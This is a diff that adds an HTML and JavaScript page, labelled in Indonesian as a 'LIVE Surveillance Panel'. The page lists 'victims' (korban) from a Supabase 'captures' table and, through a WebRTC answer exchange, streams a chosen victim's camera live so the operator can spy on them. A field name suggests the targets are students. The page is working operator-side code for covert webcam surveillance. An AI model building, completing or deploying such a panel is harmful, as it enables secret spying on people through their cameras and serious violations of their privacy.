@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LIVE Surveillance Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #111827; color: #d1d5db; }
+        .capture-item:hover { background-color: #374151; }
+        .live-active { background-color: #c81e1e; }
+        video { width: 100%; border: 2px solid #4b5563; background-color: #000; }
+    </style>
+</head>
+<body class="font-sans">
+
+    <div class="container mx-auto p-4 md:p-8">
+        <header class="mb-8 border-b border-gray-700 pb-4">
+            <h1 class="text-3xl font-bold text-red-500">LIVE SURVEILLANCE PANEL</h1>
+            <p class="text-gray-400">Pilih korban, lalu klik "Tonton Live" untuk mengintai secara real-time.</p>
+        </header>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <!-- Kolom Daftar Korban -->
+            <div class="md:col-span-1 bg-gray-800 p-4 rounded-lg shadow-lg">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-xl font-semibold">Daftar Korban</h2>
+                    <button id="refreshBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded transition">Refresh</button>
+                </div>
+                <div id="capture-list" class="space-y-2 max-h-[70vh] overflow-y-auto">
+                    <p>Memuat data...</p>
+                </div>
+            </div>
+
+            <!-- Kolom Live View -->
+            <div id="detail-view" class="md:col-span-2 bg-gray-800 p-6 rounded-lg shadow-lg">
+                <h2 class="text-2xl font-bold mb-4" id="detail-title">Pilih Korban</h2>
+                <div id="video-container" class="space-y-4">
+                    <!-- Video stream akan muncul di sini -->
+                </div>
+                <div id="initial-view">
+                    <p class="text-gray-400 text-xl">Data korban akan muncul di sini setelah dipilih.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <script>
+        const captureListEl = document.getElementById('capture-list');
+        const detailViewEl = document.getElementById('detail-view');
+        const initialViewEl = document.getElementById('initial-view');
+        const videoContainerEl = document.getElementById('video-container');
+        const detailTitleEl = document.getElementById('detail-title');
+        const refreshBtn = document.getElementById('refreshBtn');
+
+        // GANTI INI DENGAN KREDENSIAL SUPABASE-MU!
+        const SUPABASE_URL = 'https://URL-PROYEK-MU.supabase.co'; 
+        const SUPABASE_KEY = 'KUNCI-ANON-MU';
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        let peerConnection;
+        
+        async function fetchCaptures() {
+            const { data: captures, error } = await supabase.from('captures').select('*').order('created_at', { ascending: false });
+            if (error) { captureListEl.innerHTML = `<p class="text-red-500">Error: ${error.message}</p>`; return; }
+            
+            captureListEl.innerHTML = captures.length === 0 ? '<p class="text-gray-400">Belum ada korban.</p>' : '';
+            captures.forEach(capture => {
+                const item = document.createElement('div');
+                item.className = 'p-3 rounded cursor-pointer capture-item transition flex justify-between items-center';
+                const statusIndicator = `<span class="text-xs font-bold ${capture.status === 'connected' ? 'text-green-400' : 'text-yellow-400'}">${capture.status}</span>`;
+                item.innerHTML = `<div>${new Date(capture.created_at).toLocaleString()}</div> ${statusIndicator}`;
+                item.onclick = () => showCaptureDetail(capture);
+                captureListEl.appendChild(item);
+            });
+        }
+
+        function showCaptureDetail(capture) {
+            initialViewEl.style.display = 'none';
+            detailTitleEl.textContent = `Mengintai ${new Date(capture.created_at).toLocaleString()}`;
+            const connectBtnHTML = (capture.offer_sdp && capture.status !== 'connected') ? `<button onclick="startLiveConnection('${capture.id}')" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded transition w-full">Tonton Live</button>` : '';
+            videoContainerEl.innerHTML = `<p class="font-mono text-sm bg-gray-900 p-2 rounded">User: ${capture.userAgent}</p>${connectBtnHTML}<video id="live-video" autoplay playsinline></video>`;
+        }
+
+        async function startLiveConnection(captureId) {
+            const { data: capture, error } = await supabase.from('captures').select('*').eq('id', captureId).single();
+            if (error || !capture || !capture.offer_sdp) { alert("Gagal memulai koneksi."); return; }
+
+            peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+
+            peerConnection.ontrack = (event) => {
+                const videoEl = document.getElementById('live-video');
+                if (videoEl.srcObject !== event.streams[0]) videoEl.srcObject = event.streams[0];
+            };
+
+            const adminIceCandidates = [];
+            peerConnection.onicecandidate = async (event) => {
+                 if (event.candidate) {
+                    adminIceCandidates.push(event.candidate);
+                     await supabase.from('captures').update({ ice_candidates_admin: JSON.stringify(adminIceCandidates) }).eq('id', captureId);
+                 }
+            };
+
+            await peerConnection.setRemoteDescription(new RTCSessionDescription(JSON.parse(capture.offer_sdp)));
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+
+            await supabase.from('captures').update({ answer_sdp: JSON.stringify(answer) }).eq('id', captureId);
+            
+            if (capture.ice_candidates_student) {
+                JSON.parse(capture.ice_candidates_student).forEach(candidate => {
+                    if(candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+                });
+            }
+        }
+
+        refreshBtn.onclick = fetchCaptures;
+        fetchCaptures();
+        
+        supabase.channel('public:captures')
+          .on('postgres_changes', { event: '*', schema: 'public', table: 'captures' }, payload => fetchCaptures())
+          .subscribe();
+    </script>
+</body>
+</html>
